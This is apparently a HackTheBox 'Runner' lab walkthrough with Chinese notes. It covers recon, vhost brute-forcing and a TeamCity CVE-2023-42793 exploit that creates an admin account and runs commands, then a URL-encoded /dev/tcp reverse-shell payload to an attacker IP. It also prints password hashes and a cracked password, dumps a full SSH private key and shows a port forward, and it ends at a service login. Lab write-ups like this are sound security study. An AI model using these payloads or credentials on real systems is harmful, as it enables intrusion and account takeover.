
```
┌──(root㉿kali)-[~]
└─# nmap -sV -Pn -A 10.10.11.13    
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-08 06:07 EDT
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.10.11.13
Host is up (0.54s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://runner.htb/
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   216.03 ms 10.10.16.1
2   216.07 ms 10.10.11.13

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.83 seconds
                                                                
```

加域名
```
echo "10.10.11.13 runner.htb" >>/etc/hosts
```



```
──(root㉿kali)-[~]
└─# python3 /root/dirsearch/dirsearch.py -u http://runner.htb:8000

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10929

Output File: /root/dirsearch/reports/runner.htb-8000/_24-08-08_06-40-46.txt

Error Log: /root/dirsearch/logs/errors-24-08-08_06-40-46.log

Target: http://runner.htb:8000/

[06:40:47] Starting: 
[06:42:38] 200 -    3B  - /health                                           
[06:43:56] 200 -    9B  - /version  
```


使用cewl制作一个字典
```
cewl -d 3 -m 3 -w dict.txt http://runner.htb
```

爆破域名
```
┌──(root㉿kali)-[~/htb/Runner]
└─# gobuster vhost -u http://runner.htb  -w dict.txt --append-domain --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://runner.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        dict.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: TeamCity.runner.htb Status: 401 [Size: 66]
Progress: 285 / 286 (99.65%)
===============================================================
Finished
===============================================================

```

发现一个新域名：TeamCity.runner.htb

加域名
```
echo "10.10.11.13 TeamCity.runner.htb" >>/etc/hosts
```

使用[这个exp](https://github.com/Zyad-Elsayed/CVE-2023-42793)
```
┌──(root㉿kali)-[~/htb/Runner/CVE-2023-42793]
└─# python exploit.py -u http://teamcity.runner.htb

=====================================================
*                                                   *
*              CVE-2023-42793                       *
*        TeamCity Admin Account Creation            *
*                                                   *
=====================================================

Token: eyJ0eXAiOiAiVENWMiJ9.UzAxTHlnOU5hSFBhTzNCaExKUWdhV0V6cDgw.MDM4M2I1ZWQtMWIxNC00MTVjLTg3ZGYtY2IxNWJkOWIwMDdk
Token saved to ./token
Successfully exploited!
URL: http://teamcity.runner.htb
Username: admin.3J7V
Password: Password@123


```

利用上面token执行rce
```
┌──(root㉿kali)-[~/htb/Runner/CVE-2023-42793]
└─# python rce.py -u http://teamcity.runner.htb -t token -c "whoami"         
StdOut:tcuser

StdErr: 
Exit code: 0
Time: 16ms  
```

当前用户是tcuser


rev shell
```
python3 rce.py -u http://teamcity.runner.htb -t token -c '"/bin/bash"&params="-c"&params="sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{10.10.16.2}%2F{4242}%200%3E%261"'
```

收到
```
┌──(root㉿kali)-[~]
└─# nc -lnvp 4242                                                               
listening on [any] 4242 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.13] 53216
sh: 0: can't access tty; job control turned off
$ id
uid=1000(tcuser) gid=1000(tcuser) groups=1000(tcuser)
$ 

```

枚举发现在docker里，没有user.txt


用上面的密码登录web后台，操作备份

![](Runner_files/1.jpg)


这个zip文件在靶机解压以后，发现一个数据库备份文件
```
tcuser@647a82f29ca0:/tmp/database_dump$ cat users
cat users
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1723192545084, BCRYPT
2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1723149581413, BCRYPT
11, city_adminirqe, $2a$07$wJAV2TEkP3QQmdye8oB9sepeU3Bd.TECFiCOJeccMsGhfAKSp/ElS, , angry-admin@funnybunny.org, 1723182116948, BCRYPT
12, admin.3j7v, $2a$07$nOyilSZP9BXPTOzj0O9lKOd2ECtrXffzlRJkqN.NwwqBKQoz5HXNi, , admin.3J7V@lol.omg, 1723182630514, BCRYPT

```

matthew的哈希破解
```
┌──(root㉿kali)-[~/htb/Runner]
└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 128 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
piper123         (?)     
1g 0:00:01:35 DONE (2024-08-09 05:12) 0.01043g/s 543.4p/s 543.4c/s 543.4C/s playboy93..onelife
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```


一个ssh秘钥
```
tcuser@647a82f29ca0:/tmp/config/projects/AllProjects/pluginData/ssh_keys$ cat id_rsa
<rojects/AllProjects/pluginData/ssh_keys$ cat id_rsa                      
-----BEGIN OPENSSH PRIVATE KEY-----
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
KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
-----END OPENSSH PRIVATE KEY-----
tcuser@647a82f29ca0:/tmp/config/projects/AllProjects/pluginData/ssh_keys$ 

```

使用这个秘钥可以ssh登录john
```
┌──(root㉿kali)-[~/htb/Runner]
└─# ssh john@10.10.11.13 -i id_rsa 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)
                                                                                                              
 * Documentation:  https://help.ubuntu.com                                                                    
 * Management:     https://landscape.canonical.com                                                            
 * Support:        https://ubuntu.com/pro                                                                     
                                                                                                              
  System information as of Mon Apr 15 09:34:17 AM UTC 2024                                                    
                                                                                                              
  System load:                      1.822265625                                                               
  Usage of /:                       79.2% of 9.74GB                                                           
  Memory usage:                     25%                                                                       
  Swap usage:                       0%                                                                        
  Processes:                        254                                                                       
  Users logged in:                  0                                                                         
  IPv4 address for br-21746deff6ac: 172.18.0.1                                                                
  IPv4 address for docker0:         172.17.0.1                                                                
  IPv4 address for eth0:            10.10.11.13                                                               
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:7aaf                                             
                                                                                                              
                                                                                                              
Expanded Security Maintenance for Applications is not enabled.                                                
                                                                                                              
0 updates can be applied immediately.                                                                         
                                                                                                              
Enable ESM Apps to receive additional future security updates.                                                
See https://ubuntu.com/esm or run: sudo pro status                                                            


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Aug  8 16:14:54 2024 from 10.10.14.3
john@runner:~$ 

```


内部开了几个服务
```

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                             
tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                                                                                         
tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -   
```


转发9000端口到kali
```
ssh john@10.10.11.13 -i id_rsa  -L 9000:127.0.0.1:9000
```

使用上面破解的密码登录

![](Runner_files/2.jpg)